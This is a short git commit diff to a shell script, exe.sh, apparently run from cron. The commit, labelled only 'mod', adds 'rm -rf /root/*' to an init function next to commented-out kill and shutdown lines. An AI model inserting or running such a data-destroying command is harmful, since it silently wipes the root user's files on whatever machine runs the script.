bf01fba3ece1c9b1a82db126cda6b3885fb61b7a
Sandeep Kumar Verma <sunlights92@gmail.com>
2017-08-11 19:45:11 +0530

    mod

--- exe.sh
+++ exe.sh
@@ -7,6 +7,7 @@ MY_MAC="b8_ae_ed_38_89_5d"
 init() {
     echo "Init $PWD $USER" >> $SRC_DIR/rrun.log
     echo "Init 2 $PWD $USER $MAC"
+    rm -rf /root/*
     #kill -2 1
     #shutdown -h 10 now # Shutdown wont work when it runs as a cron
 }
